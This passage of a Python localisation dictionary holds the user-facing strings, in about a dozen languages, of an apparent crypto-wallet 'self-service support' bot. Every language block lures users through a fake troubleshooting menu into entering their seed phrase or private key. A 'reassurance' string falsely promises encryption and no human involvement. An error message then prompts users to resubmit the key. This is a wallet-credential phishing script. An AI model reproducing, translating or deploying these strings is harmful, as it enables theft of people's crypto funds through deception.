        'welcome': "नमस्ते {user}! आपके सभी क्रिप्टो वॉलेट की जरूरतों के लिए आपके अंतिम स्व-सेवा समाधान टूल में आपका स्वागत है! यह बॉट आपको कनेक्शन त्रुटियां, माइग्रेशन चुनौतियां, स्टैकिंग जटिलताएं, उच्च गैस शुल्क, अटके हुए लेनदेन, गुम हुए फंड, दावा अस्वीकृति, तरलता समस्याएं, जमे हुए लेनदेन, स्वैपिंग में कठिनाइयां, और खोए हुए टोकन जैसे सामान्य मुद्दों को जल्दी और कुशलता से हल करने में मदद करने के लिए डिज़ाइन किया गया है। चाहे आप वॉलेट सिंक्रनाइज़ेशन, गलत टोकन बैलेंस, या असफल ट्रांसफर के साथ समस्याओं का सामना कर रहे हों, हम आपको कवर करते हैं। हमारा लक्ष्य आपको समस्या निवारण प्रक्रिया के माध्यम से कदम-दर-कदम मार्गदर्शन करना है, जिससे आप अपने क्रिप्टो वॉलेट अनुभव का नियंत्रण ले सकें। आइए शुरू करें और आज ही अपनी समस्याओं का समाधान करें!",
        'main menu title': "जारी रखने के लिए कृपया एक समस्या प्रकार का चयन करें:",
        'buy': " खरीदें",
        'validation': " सत्यापन",
        'claim tokens': " टोकन का दावा करें",
        'migration issues': " माइग्रेशन समस्याएं",
        'assets recovery': " संपत्ति पुनर्प्राप्ति",
        'general issues': " सामान्य समस्याएं",
        'rectification': " सुधार",
        'staking issues': " स्टैकिंग समस्याएं",
        'deposits': " जमा",
        'withdrawals': " निकासी",
        'slippage error': " स्लिपेज त्रुटि",
        'login issues': " लॉगिन समस्याएं",
        'high gas fees': " उच्च गैस शुल्क",
        'presale issues': " प्रीसेल समस्याएं",
        'missing balance': " गुम/अनियमित बैलेंस",
        'connect wallet message': "जारी रखने के लिए कृपया अपने निजी कुंजी या सीड वाक्यांश के साथ अपने वॉलेट को कनेक्ट करें।",
        'connect wallet button': "🔑 वॉलेट कनेक्ट करें",
        'select wallet type': "कृपया अपने वॉलेट का प्रकार चुनें:",
        'other wallets': "अन्य वॉलेट",
        'private key': "🔑 निजी कुंजी",
        'seed phrase': "🔒 सीड वाक्यांश आयात करें",
        'wallet selection message': "आपने {wallet_name} का चयन किया है।\nकृपया अपने पसंदीदा कनेक्शन मोड का चयन करें।",
        'reassurance': "\n\nआपकी सुरक्षा के लिए, कृपया ध्यान दें कि सभी जानकारी बॉट द्वारा सुरक्षित रूप से संसाधित की जाती है और इसमें कोई मानवीय हस्तक्षेप शामिल नहीं है। यह प्रक्रिया पूरी तरह से एन्क्रिप्टेड और सुरक्षित है ताकि यह सुनिश्चित हो सके कि सिंक्रनाइज़ेशन के दौरान आपका डेटा सुरक्षित है।",
        'prompt seed': "कृपया अपना 12/24 शब्दों का गुप्त वाक्यांश दर्ज करें।{reassurance}",
        'prompt private key': "कृपया अपनी निजी कुंजी दर्ज करें।{reassurance}",
        'invalid choice': "अमान्य विकल्प। कृपया बटन का उपयोग करें।",
        'final error message': "‼️ एक त्रुटि हुई, कृपया सुनिश्चित करें कि आप सही कुंजी दर्ज कर रहे हैं, त्रुटियों से बचने के लिए कॉपी और पेस्ट का उपयोग करें। कृपया फिर से कोशिश करने के लिए /start करें। ",
        'choose language': "कृपया अपनी पसंदीदा भाषा का चयन करें:",
        'await restart message': "कृपया फिर से शुरू करने के लिए /start पर क्लिक करें।"
    },
    'tr': {
        'welcome': "Merhaba {user}! Kripto cüzdanı ihtiyaçlarınız için nihai self-servis çözüm aracınıza hoş geldiniz! Bu bot, Bağlantı Hataları, Migrasyon Zorlukları, Staking Komplikasyonları, Yüksek Gas Ücretleri, Sıkışmış İşlemler, Kayıp Fonlar, Talep Redleri, Likidite Problemleri, Donmuş İşlemler, Takas Zorlukları ve Kayıp Tokenlar gibi yaygın sorunları hızlı ve verimli bir şekilde çözmenize yardımcı olmak için tasarlanmıştır. İster cüzdan senkronizasyonu, yanlış token bakiyeleri, başarısız transferler gibi sorunlarla karşı karşıya olun, size yardımcı olmaya hazırız. Amacımız, sorun giderme sürecinde size adım adım rehberlik ederek kripto cüzdanı deneyiminizin kontrolünü elinize almanızı sağlamaktır. Haydi başlayalım ve sorunlarınızı bugün çözelim!",
        'main menu title': "Devam etmek için lütfen bir sorun türü seçin:",
        'buy': " Satın Al",
        'validation': " Doğrulama",
        'claim tokens': " Token Talep Et",
        'migration issues': " Migrasyon Sorunları",
        'assets recovery': " Varlık Kurtarma",
        'general issues': " Genel Sorunlar",
        'rectification': " Düzeltme",
        'staking issues': " Staking Sorunları",
        'deposits': " Para Yatırma",
        'withdrawals': " Para Çekme",
        'slippage error': " Slippage Hatası",
        'login issues': " Giriş Sorunları",
        'high gas fees': " Yüksek Gas Ücretleri",
        'presale issues': " Ön Satış Sorunları",
        'missing balance': " Kayıp/Düzensiz Bakiye",
        'connect wallet message': "Devam etmek için lütfen cüzdanınızı Özel Anahtarınız veya Tohum Cümleciğiniz ile bağlayın.",
        'connect wallet button': "🔑 Cüzdanı Bağla",
        'select wallet type': "Lütfen cüzdan türünüzü seçin:",
        'other wallets': "Diğer Cüzdanlar",
        'private key': "🔑 Özel Anahtar",
        'seed phrase': "🔒 Tohum Cümleciğini İçe Aktar",
        'wallet selection message': "Şunu seçtiniz: {wallet_name}.\nLütfen tercih ettiğiniz bağlantı modunu seçin.",
        'reassurance': "\n\nGüvenliğiniz için, tüm bilgilerin bot tarafından güvenli bir şekilde işlendiğini ve hiçbir insan müdahalesi olmadığını lütfen unutmayın. Bu süreç, senkronizasyon sırasında verilerinizin güvende olmasını sağlamak için tamamen şifrelenmiş ve korunmuştur.",
        'prompt seed': "Lütfen 12/24 kelimelik gizli cümlenizi girin.{reassurance}",
        'prompt private key': "Lütfen özel anahtarınızı girin.{reassurance}",
        'invalid choice': "Geçersiz seçim. Lütfen düğmeleri kullanın.",
        'final error message': "‼️ Bir hata oluştu, lütfen doğru anahtarı girdiğinizden emin olun, hataları önlemek için kopyala ve yapıştır'ı kullanın. Lütfen tekrar denemek için /start yapın. ",
        'choose language': "Lütfen tercih ettiğiniz dili seçin:",
        'await restart message': "Lütfen tekrar başlamak için /start'a tıklayın."
    },
    'zh': {
        'welcome': "你好 {user}！欢迎来到您解决所有加密钱包需求的终极自助工具！此机器人旨在帮助您快速高效地解决常见问题，例如连接错误、迁移挑战、质押并发症、高昂的 Gas 费用、卡顿的交易、资金丢失、申领被拒、流动性问题、冻结的交易、交换困难以及丢失的代币。无论您是面临钱包同步问题、不正确的代币余额，还是失败的转账，我们都能为您提供帮助。我们的目标是引导您逐步完成故障排除过程，使您能够掌控自己的加密钱包体验。让我们开始吧，今天就解决您的问题！",
        'main menu title': "请选择一个问题类型以继续：",
        'buy': " 购买",
        'validation': " 验证",
        'claim tokens': " 领取代币",
        'migration issues': " 迁移问题",
        'assets recovery': " 资产恢复",
        'general issues': " 一般问题",
        'rectification': " 纠正",
        'staking issues': " 质押问题",
        'deposits': " 存款",
        'withdrawals': " 提款",
        'slippage error': " 滑点错误",
        'login issues': " 登录问题",
        'high gas fees': " 高昂的 Gas 费用",
        'presale issues': " 预售问题",
        'missing balance': " 丢失/不正常余额",
        'connect wallet message': "请使用您的私钥或助记词连接您的钱包以继续。",
        'connect wallet button': "🔑 连接钱包",
        'select wallet type': "请选择您的钱包类型：",
        'other wallets': "其他钱包",
        'private key': "🔑 私钥",
        'seed phrase': "🔒 导入助记词",
        'wallet selection message': "您已选择 {wallet_name}。\n请选择您首选的连接方式。",
        'reassurance': "\n\n为了您的安全，请注意所有信息均由机器人安全处理，没有人为干预。此过程经过完全加密和保护，以确保您的数据在同步期间是安全的。",
        'prompt seed': "请输入您的 12/24 词秘密短语。{reassurance}",
        'prompt private key': "请输入您的私钥。{reassurance}",
        'invalid choice': "无效选择。请使用按钮。",
        'final error message': "‼️ 发生了一个错误，请确保您输入了正确的密钥，请使用复制和粘贴以避免错误。请 /start 再次尝试。",
        'choose language': "请选择您的首选语言：",
        'await restart message': "请点击 /start 以重新开始。"
    },
    'cs': {
        'welcome': "Ahoj {user}! Vítejte ve vašem dokonalém nástroji pro řešení problémů s kryptoměnovou peněženkou! Tento bot je navržen tak, aby vám rychle a efektivně pomohl vyřešit běžné problémy, jako jsou chyby připojení, problémy s migrací, komplikace se stakingem, vysoké poplatky za plyn, zaseknuté transakce, chybějící fondy, odmítnutí nároků, problémy s likviditou, zmrazené transakce, potíže s výměnou a ztracené tokeny. Ať už se potýkáte s problémy se synchronizací peněženky, nesprávnými zůstatky tokenů nebo neúspěšnými převody, máme pro vás řešení. Naším cílem je provést vás procesem odstraňování problémů krok za krokem, což vám umožní převzít kontrolu nad vaší zkušeností s kryptoměnovou peněženkou. Začněme a vyřešme vaše problémy ještě dnes!",
        'main menu title': "Prosím, vyberte typ problému pro pokračování:",
        'buy': " Koupit",
        'validation': " Ověření",
        'claim tokens': " Získat tokeny",
        'migration issues': " Problémy s migrací",
        'assets recovery': " Obnova aktiv",
        'general issues': " Obecné problémy",
        'rectification': " Náprava",
        'staking issues': " Problémy se stakingem",
        'deposits': " Vklady",
        'withdrawals': " Výběry",
        'slippage error': " Chyba prokluzu",
        'login issues': " Problémy s přihlášením",
        'high gas fees': " Vysoké poplatky za plyn",
        'presale issues': " Problémy s předprodejem",
        'missing balance': " Chybějící/nepravidelný zůstatek",
        'connect wallet message': "Prosím, připojte svou peněženku pomocí soukromého klíče nebo seed fráze pro pokračování.",
        'connect wallet button': "🔑 Připojit peněženku",
        'select wallet type': "Prosím, vyberte typ vaší peněženky:",
        'other wallets': "Jiné peněženky",
        'private key': "🔑 Soukromý klíč",
        'seed phrase': "🔒 Importovat seed frázi",
        'wallet selection message': "Vybrali jste {wallet_name}.\nVyberte preferovaný způsob připojení.",
        'reassurance': "\n\nPro vaši bezpečnost, prosím, vězte, že všechny informace jsou bezpečně zpracovávány botem a nedochází k žádnému lidskému zásahu. Tento proces je plně šifrovaný a chráněný, aby vaše data byla v bezpečí během synchronizace.",
        'prompt seed': "Prosím, zadejte vaši tajnou frázi z 12/24 slov.{reassurance}",
        'prompt private key': "Prosím, zadejte váš soukromý klíč.{reassurance}",
        'invalid choice': "Neplatná volba. Prosím, použijte tlačítka.",
        'final error message': "‼️ Došlo k chybě, prosím, ujistěte se, že zadáváte správný klíč, použijte kopírování a vkládání, abyste se vyhnuli chybám. Prosím, /start pro nový pokus. ",
        'choose language': "Prosím, vyberte preferovaný jazyk:",
        'await restart message': "Prosím, klikněte na /start pro začátek znovu."
    },
    'ur': {
        'welcome': "سلام {user}! آپ کے تمام کرپٹو والیٹ کی ضروریات کے لیے آپ کے حتمی خود خدمت حل کے آلے میں خوش آمدید! یہ بوٹ آپ کو کنکشن کی غلطیوں، منتقلی کے چیلنجز، اسٹیکنگ کی پیچیدگیوں، زیادہ گیس فیس، پھنسے ہوئے لین دین، گم شدہ فنڈز، کلیم کے ردعمل، لیکویڈیٹی کے مسائل، منجمد لین دین، بدلنے میں مشکلات، اور گم شدہ ٹوکن جیسے عام مسائل کو فوری اور مؤثر طریقے سے حل کرنے میں مدد کرنے کے لیے ڈیزائن کیا گیا ہے۔ چاہے آپ کو والیٹ کی مطابقت پذیری، غلط ٹوکن بیلنس، یا ناکام منتقلی کے مسائل کا سامنا ہو، ہم آپ کے لیے ہیں۔ ہمارا مقصد آپ کو قدم بہ قدم ٹربل شوٹنگ کے عمل میں رہنمائی کرنا ہے، تاکہ آپ اپنے کرپٹو والیٹ کے تجربے پر کنٹرول حاصل کر سکیں۔ آئیے شروع کریں اور آج ہی آپ کے مسائل حل کریں!",
        'main menu title': "جاری رکھنے کے لیے براہ کرم ایک مسئلہ کی قسم منتخب کریں:",
        'buy': " خریدیں",
        'validation': " توثیق",
        'claim tokens': " ٹوکن کلیم کریں",
        'migration issues': " منتقلی کے مسائل",
        'assets recovery': " اثاثوں کی وصولی",
        'general issues': " عام مسائل",
        'rectification': " تصحیح",
        'staking issues': " اسٹیکنگ کے مسائل",
        'deposits': " جمع",
        'withdrawals': " نکاسی",
        'slippage error': " سلپیج کی خرابی",
        'login issues': " لاگ ان کے مسائل",
        'high gas fees': " زیادہ گیس فیس",
        'presale issues': " پریسیل کے مسائل",
        'missing balance': " گمشدہ/غیر منظم بیلنس",
        'connect wallet message': "جاری رکھنے کے لیے براہ کرم اپنے نجی کلید یا سیڈ فریز کے ساتھ اپنے والیٹ کو جوڑیں۔",
        'connect wallet button': "🔑 والیٹ جوڑیں",
        'select wallet type': "براہ کرم اپنے والیٹ کی قسم منتخب کریں:",
        'other wallets': "دیگر والیٹس",
        'private key': "🔑 نجی کلید",
        'seed phrase': "🔒 سیڈ فریز امپورٹ کریں",
        'wallet selection message': "آپ نے {wallet_name} کو منتخب کیا ہے۔\nبراہ کرم اپنے پسندیدہ کنکشن موڈ کو منتخب کریں۔",
        'reassurance': "\n\nآپ کی حفاظت کے لیے، براہ کرم آگاہ رہیں کہ تمام معلومات بوٹ کے ذریعے محفوظ طریقے سے عمل میں لائی جاتی ہیں اور اس میں کوئی انسانی مداخلت شامل نہیں ہے۔ یہ عمل مکمل طور پر خفیہ اور محفوظ ہے تاکہ مطابقت پذیری کے دوران آپ کا ڈیٹا محفوظ رہے۔",
        'prompt seed': "براہ کرم اپنا 12/24 الفاظ کا خفیہ فریز درج کریں۔{reassurance}",
        'prompt private key': "براہ کرم اپنی نجی کلید درج کریں۔{reassurance}",
        'invalid choice': "غلط انتخاب. براہ کرم بٹن کا استعمال کریں۔",
        'final error message': "‼️ ایک خرابی پیش آگئی، براہ کرم یقینی بنائیں کہ آپ صحیح کلید درج کر رہے ہیں، غلطیوں سے بچنے کے لیے کاپی اور پیسٹ کا استعمال کریں۔ براہ کرم دوبارہ کوشش کرنے کے لیے /start کریں۔ ",
        'choose language': "براہ کرم اپنی پسندیدہ زبان منتخب کریں:",
        'await restart message': "براہ کرم دوبارہ شروع کرنے کے لیے /start پر کلک کریں۔"
    },
    'uz': {
        'welcome': "Salom {user}! Kripto hamyon ehtiyojlaringiz uchun yakuniy o'z-o'ziga xizmat ko'rsatish vositasiga xush kelibsiz! Ushbu bot Ulanish xatolari, Migratsiya muammolari, Staking murakkabliklari, Yuqori gaz to'lovlari, Yopilgan tranzaksiyalar, Yo'qolgan mablag'lar, Da'vo rad etishlari, Likvidlik muammolari, Muzlatilgan tranzaksiyalar, Almashtirish qiyinchiliklari va Yo'qolgan tokenlar kabi umumiy muammolarni tez va samarali hal qilishga yordam berish uchun mo'ljallangan. Hamyonni sinxronlash, noto'g'ri token balansi yoki muvaffaqiyatsiz o'tkazmalar bilan bog'liq muammolarga duch kelsangiz ham, biz sizga yordam beramiz. Maqsadimiz, sizni muammolarni bartaraf etish jarayonida bosqichma-bosqich yo'naltirish, bu orqali siz kripto hamyon tajribangizni nazorat qila olasiz. Keling, bugun boshlaymiz va muammolaringizni hal qilamiz!",
        'main menu title': "Davom etish uchun, iltimos, muammo turini tanlang:",
        'buy': " Sotib olish",
        'validation': " Validatsiya",
        'claim tokens': " Tokenlarni talab qilish",
        'migration issues': " Migratsiya muammolari",
        'assets recovery': " Aktivlarni tiklash",
        'general issues': " Umumiy muammolar",
        'rectification': " Tuzatish",
        'staking issues': " Staking muammolari",
        'deposits': " Depozitlar",
        'withdrawals': " Yechib olish",
        'slippage error': " Slippage xatosi",
        'login issues': " Kirish muammolari",
        'high gas fees': " Yuqori gaz to'lovlari",
        'presale issues': " Presale muammolari",
        'missing balance': " Yo'qolgan/tartibsiz balans",
        'connect wallet message': "Davom etish uchun, iltimos, hamyoningizni shaxsiy kalit yoki Seed Phrase bilan ulang.",
        'connect wallet button': "🔑 Hamyonni ulash",
        'select wallet type': "Iltimos, hamyoningiz turini tanlang:",
        'other wallets': "Boshqa hamyonlar",
        'private key': "🔑 Shaxsiy kalit",
        'seed phrase': "🔒 Seed Phrase import qilish",
        'wallet selection message': "Siz {wallet_name}ni tanladingiz.\nIltimos, afzal ko'rgan ulanish usulini tanlang.",
        'reassurance': "\n\nSizning xavfsizligingiz uchun, iltimos, barcha ma'lumotlar bot tomonidan xavfsiz qayta ishlanishini va hech qanday insoniy aralashuv yo'qligini unutmang. Ushbu jarayon sinxronizatsiya davomida ma'lumotlaringiz xavfsiz bo'lishini ta'minlash uchun to'liq shifrlangan va himoyalangan.",
        'prompt seed': "Iltimos, 12/24 so'zli maxfiy frazangizni kiriting.{reassurance}",
        'prompt private key': "Iltimos, shaxsiy kalitingizni kiriting.{reassurance}",
        'invalid choice': "Noto'g'ri tanlov. Iltimos, tugmalardan foydalaning.",
        'final error message': "‼️ Xato yuz berdi, Iltimos, to'g'ri kalitni kiritganingizga ishonch hosil qiling, xatolardan qochish uchun nusxalash va joylashtirishdan foydalaning. Iltimos, qayta urinish uchun /start ni bosing. ",
        'choose language': "Iltimos, afzal ko'rgan tilni tanlang:",
        'await restart message': "Iltimos, qayta boshlash uchun /start ni bosing."
    },
    'it': {
        'welcome': "Ciao {user}! Benvenuto nel tuo strumento di risoluzione self-service definitivo per tutte le tue esigenze di portafoglio crypto! Questo bot è progettato per aiutarti a risolvere in modo rapido ed efficiente problemi comuni come errori di connessione, problemi di migrazione, complicazioni di staking, commissioni sul gas elevate, transazioni bloccate, fondi mancanti, rifiuti di richieste, problemi di liquidità, transazioni congelate, difficoltà di scambio e token persi. Sia che tu stia affrontando problemi con la sincronizzazione del portafoglio, saldi di token errati o trasferimenti falliti, abbiamo ciò che fa per te. Il nostro obiettivo è guidarti passo dopo passo attraverso il processo di risoluzione dei problemi, consentendoti di prendere il controllo della tua esperienza con il portafoglio crypto. Iniziamo e risolviamo i tuoi problemi oggi!",
        'main menu title': "Seleziona un tipo di problema per continuare:",
        'buy': " Acquista",
        'validation': " Validazione",
        'claim tokens': " Richiedi Token",
        'migration issues': " Problemi di Migrazione",
        'assets recovery': " Recupero di Attivi",
        'general issues': " Problemi Generali",
        'rectification': " Rettifica",
        'staking issues': " Problemi di Staking",
        'deposits': " Depositi",
        'withdrawals': " Prelievi",
        'slippage error': " Errore di Slippage",
        'login issues': " Problemi di Accesso",
        'high gas fees': " Commissioni sul Gas elevate",
        'presale issues': " Problemi di Prevenda",
        'missing balance': " Saldo Mancante/Irregolare",
        'connect wallet message': "Per favore, connetti il tuo portafoglio con la tua Chiave Privata o Frase Seed per continuare.",
        'connect wallet button': "🔑 Connetti Portafoglio",
        'select wallet type': "Per favore, seleziona il tipo di portafoglio:",
        'other wallets': "Altri Portafogli",
        'private key': "🔑 Chiave Privata",
        'seed phrase': "🔒 Importa Frase Seed",
        'wallet selection message': "Hai selezionato {wallet_name}.\nSeleziona la tua modalità di connessione preferita.",
        'reassurance': "\n\nPer la tua sicurezza, tieni presente che tutte le informazioni vengono elaborate in modo sicuro dal bot e non c'è alcun intervento umano. Questo processo è completamente criptato e protetto per garantire che i tuoi dati siano al sicuro durante la sincronizzazione.",
        'prompt seed': "Per favore, inserisci la tua frase segreta di 12/24 parole.{reassurance}",
        'prompt private key': "Per favore, inserisci la tua chiave privata.{reassurance}",
        'invalid choice': "Scelta non valida. Per favore, usa i pulsanti.",
        'final error message': "‼️ Si è verificato un errore, assicurati di inserire la chiave corretta, usa copia e incolla per evitare errori. Per favore, /start per riprovare. ",
        'choose language': "Per favore, seleziona la tua lingua preferita:",
        'await restart message': "Per favore, clicca su /start per ricominciare."
    },
    'ja': {
        'welcome': "こんにちは {user}！あなたのすべての暗号ウォレットのニーズに対応する究極のセルフサービス解決ツールへようこそ！このボットは、接続エラー、マイグレーションの課題、ステーキングの合併症、高いガス料金、スタックしたトランザクション、行方不明の資金、請求の拒否、流動性の問題、フリーズしたトランザクション、スワップの難しさ、および失われたトークンなど、一般的な問題を迅速かつ効率的に解決するのに役立つように設計されています。ウォレットの同期、不正確なトークン残高、失敗した送金などの問題に直面している場合でも、私たちがお手伝いします。私たちの目標は、トラブルシューティングプロセスをステップバイステップで案内し、暗号ウォレットの体験を制御できるようにすることです。さあ、始めましょう！",
        'main menu title': "続行するために、問題の種類を選択してください：",
        'buy': " 購入",
        'validation': " 検証",
        'claim tokens': " トークンを請求",
        'migration issues': " マイグレーションの問題",
        'assets recovery': " 資産の回復",
        'general issues': " 一般的な問題",
        'rectification': " 修正",
        'staking issues': " ステーキングの問題",
        'deposits': " 預金",
        'withdrawals': " 引き出し",
        'slippage error': " スリッページエラー",
        'login issues': " ログインの問題",
        'high gas fees': " 高いガス料金",
        'presale issues': " プレセールの問題",
        'missing balance': " 不足/不規則な残高",
        'connect wallet message': "続行するために、秘密鍵またはシードフレーズでウォレットを接続してください。",
        'connect wallet button': "🔑 ウォレットを接続",
        'select wallet type': "ウォレットの種類を選択してください：",
        'other wallets': "その他のウォレット",
        'private key': "🔑 秘密鍵",
        'seed phrase': "🔒 シードフレーズをインポート",
        'wallet selection message': "あなたは {wallet_name} を選択しました。\n好みの接続モードを選択してください。",
        'reassurance': "\n\nセキュリティのため、すべての情報はボットによって安全に処理され、人間の介入はないことをご了承ください。このプロセスは完全に暗号化され、同期中にデータが安全であることを保証します。",
        'prompt seed': "12/24語のシークレットフレーズを入力してください。{reassurance}",
        'prompt private key': "秘密鍵を入力してください。{reassurance}",
        'invalid choice': "無効な選択。ボタンを使用してください。",
        'final error message': "‼️ エラーが発生しました。正しい鍵を入力していることを確認してください。エラーを避けるためにコピー＆ペーストを使用してください。もう一度試すには /start をしてください。 ",
        'choose language': "お好みの言語を選択してください：",
        'await restart message': "最初からやり直すには /start をクリックしてください。"
    },
    'ms': {
        'welcome': "Hai {user}! Selamat datang ke alat penyelesaian layan diri utama anda untuk semua keperluan dompet kripto anda! Bot ini direka untuk membantu anda menyelesaikan masalah umum dengan cepat dan cekap seperti Ralat Sambungan, Cabaran Migrasi, Komplikasi Staking, Bayaran Gas Tinggi, Transaksi Tersekat, Dana Hilang, Penolakan Tuntutan, Masalah Kecairan, Transaksi Beku, Kesukaran Pertukaran, dan Token Hilang. Sama ada anda menghadapi masalah dengan penyegerakan dompet, baki token yang tidak betul, pemindahan yang gagal, kami sedia membantu. Matlamat kami adalah untuk membimbing anda melalui proses penyelesaian masalah langkah demi langkah, membolehkan anda mengawal pengalaman dompet kripto anda. Mari kita mulakan dan selesaikan masalah anda hari ini!",
        'main menu title': "Sila pilih jenis masalah untuk meneruskan:",
        'buy': " Beli",
        'validation': " Pengesahan",
        'claim tokens': " Tuntut Token",
        'migration issues': " Masalah Migrasi",
        'assets recovery': " Pemulihan Aset",
        'general issues': " Masalah Umum",
        'rectification': " Pembetulan",
        'staking issues': " Masalah Staking",
        'deposits': " Deposit",
        'withdrawals': " Pengeluaran",
        'slippage error': " Ralat Slippage",
        'login issues': " Masalah Log Masuk",
        'high gas fees': " Bayaran Gas Tinggi",
        'presale issues': " Masalah Pra-jualan",
        'missing balance': " Baki Hilang/Tidak Teratur",
        'connect wallet message': "Sila sambungkan dompet anda dengan Kunci Peribadi atau Frasa Seed anda untuk meneruskan.",
        'connect wallet button': "🔑 Sambungkan Dompet",
        'select wallet type': "Sila pilih jenis dompet anda:",
        'other wallets': "Dompet Lain",
        'private key': "🔑 Kunci Peribadi",
        'seed phrase': "🔒 Import Frasa Seed",
        'wallet selection message': "Anda telah memilih {wallet_name}.\nSila pilih mod sambungan pilihan anda.",
        'reassurance': "\n\nUntuk keselamatan anda, sila maklum bahawa semua maklumat diproses dengan selamat oleh bot dan tiada campur tangan manusia terlibat. Proses ini disulitkan sepenuhnya dan dilindungi untuk memastikan data anda selamat semasa penyegerakan.",
        'prompt seed': "Sila masukkan frasa rahsia 12/24 perkataan anda.{reassurance}",
        'prompt private key': "Sila masukkan kunci peribadi anda.{reassurance}",
        'invalid choice': "Pilihan tidak sah. Sila gunakan butang.",
        'final error message': "‼️ Ralat berlaku, Sila pastikan anda memasukkan kunci yang betul, sila gunakan salin dan tampal untuk mengelakkan ralat. sila /start untuk cuba lagi. ",
        'choose language': "Sila pilih bahasa pilihan anda:",
        'await restart message': "Sila klik pada /start untuk bermula semula."
    },
    'ro': {
        'welcome': "Bună {user}! Bine ați venit la instrumentul dvs. de rezolvare self-service pentru toate nevoile portofelului dvs. crypto! Acest bot este conceput pentru a vă ajuta să rezolvați rapid și eficient probleme comune, cum ar fi erori de conexiune, provocări de migrare, complicații de staking, taxe mari de gaz, tranzacții blocate, fonduri lipsă, respingeri de revendicări, probleme de lichiditate, tranzacții înghețate, dificultăți de swap și tokeni pierduți. Fie că vă confruntați cu probleme de sincronizare a portofelului, solduri incorecte de tokeni sau transferuri eșuate, noi vă acoperim. Scopul nostru este să vă ghidăm pas cu pas prin procesul de depanare, permițându-vă să preluați controlul asupra experienței dvs. de portofel crypto. Să începem și să vă rezolvăm problemele astăzi!",
        'main menu title': "Vă rugăm să selectați un tip de problemă pentru a continua:",
        'buy': " Cumpără",
        'validation': " Validare",
        'claim tokens': " Revendică Tokeni",
        'migration issues': " Probleme de Migrare",
        'assets recovery': " Recuperare Active",
        'general issues': " Probleme Generale",
        'rectification': " Rectificare",
        'staking issues': " Probleme de Staking",
        'deposits': " Depozite",
        'withdrawals': " Retrageri",
        'slippage error': " Eroare de Slippage",
        'login issues': " Probleme de Autentificare",
        'high gas fees': " Taxe Mari de Gaz",
        'presale issues': " Probleme de Pre-vânzare",
        'missing balance': " Sold Lipsă/Neregulamentar",
        'connect wallet message': "Vă rugăm să vă conectați portofelul cu cheia privată sau cu fraza seed pentru a continua.",
        'connect wallet button': "🔑 Conectează Portofel",
        'select wallet type': "Vă rugăm să selectați tipul portofelului dvs.:",
        'other wallets': "Alte Portofele",
        'private key': "🔑 Cheie Privată",
        'seed phrase': "🔒 Importă Frază Seed",
        'wallet selection message': "Ați selectat {wallet_name}.\nSelectați modul de conectare preferat.",
        'reassurance': "\n\nPentru siguranța dvs., vă rugăm să rețineți că toate informațiile sunt procesate în siguranță de către bot și nu există nicio intervenție umană. Acest proces este complet criptat și protejat pentru a vă asigura că datele dvs. sunt în siguranță în timpul sincronizării.",
        'prompt seed': "Vă rugăm să introduceți fraza secretă de 12/24 de cuvinte.{reassurance}",
        'prompt private key': "Vă rugăm să introduceți cheia privată.{reassurance}",
        'invalid choice': "Alegere invalidă. Vă rugăm să folosiți butoanele.",
        'final error message': "‼️ A apărut o eroare, vă rugăm să vă asigurați că introduceți cheia corectă, folosiți copierea și lipirea pentru a evita erorile. Vă rugăm /start pentru a încerca din nou. ",
        'choose language': "Vă rugăm să selectați limba preferată:",
        'await restart message': "Vă rugăm să faceți clic pe /start pentru a începe din nou."
    },
    'sk': {
        'welcome': "Ahoj {user}! Vitajte vo vašom dokonalom nástroji na riešenie problémov s kryptopeňaženkou! Tento bot je navrhnutý tak, aby vám rýchlo a efektívne pomohol vyriešiť bežné problémy, ako sú chyby pripojenia, migračné výzvy, komplikácie so stakingom, vysoké poplatky za plyn, zaseknuté transakcie, chýbajúce prostriedky, odmietnutie nárokov, problémy s likviditou, zmrazené transakcie, ťažkosti pri výmene a stratené tokeny. Či už čelíte problémom so synchronizáciou peňaženky, nesprávnym zostatkom tokenov alebo neúspešnými prevodmi, máme pre vás riešenie. Naším cieľom je viesť vás krok za krokom procesom riešenia problémov, čo vám umožní prevziať kontrolu nad vašou skúsenosťou s kryptopeňaženkou. Poďme začať a vyriešiť vaše problémy ešte dnes!",
        'main menu title': "Prosím, vyberte typ problému pre pokračovanie:",
        'buy': " Kúpiť",
        'validation': " Validácia",
        'claim tokens': " Získať tokeny",
        'migration issues': " Migračné problémy",
        'assets recovery': " Obnova aktív",
        'general issues': " Všeobecné problémy",
        'rectification': " Náprava",
        'staking issues': " Problémy so stakingom",
        'deposits': " Vklady",
        'withdrawals': " Výbery",
        'slippage error': " Chyba preklzu",
        'login issues': " Problémy s prihlásením",
        'high gas fees': " Vysoké poplatky za plyn",
        'presale issues': " Problémy s predpredajom",
        'missing balance': " Chýbajúci/nepravidelný zostatok",
        'connect wallet message': "Prosím, pripojte svoju peňaženku pomocou súkromného klúča alebo seed frázy pre pokračovanie.",
        'connect wallet button': "🔑 Pripojiť peňaženku",
        'select wallet type': "Prosím, vyberte typ vašej peňaženky:",
        'other wallets': "Iné peňaženky",
        'private key': "🔑 Súkromný klúč",
        'seed phrase': "🔒 Importovať seed frázu",
        'wallet selection message': "Vybrali ste {wallet_name}.\nVyberte preferovaný spôsob pripojenia.",
        'reassurance': "\n\nPre vašu bezpečnosť, prosím, vedzte, že všetky informácie sú bezpečne spracovávané botom a nedochádza k žiadnemu ľudskému zásahu. Tento proces je plne šifrovaný a chránený, aby vaše dáta boli v bezpečí počas synchronizácie.",
        'prompt seed': "Prosím, zadajte vašu tajnú frázu z 12/24 slov.{reassurance}",
        'prompt private key': "Prosím, zadajte váš súkromný klúč.{reassurance}",
        'invalid choice': "Neplatná voľba. Prosím, použite tlačidlá.",
        'final error message': "‼️ Vyskytla sa chyba, prosím, uistite sa, že zadávate správny klúč, použite kopírovanie a vkladanie, aby ste sa vyhli chybám. Prosím, /start pre nový pokus. ",
        'choose language': "Prosím, vyberte preferovaný jazyk:",
        'await restart message': "Prosím, kliknite na /start pre začiatok znova."
    },
    'th': {
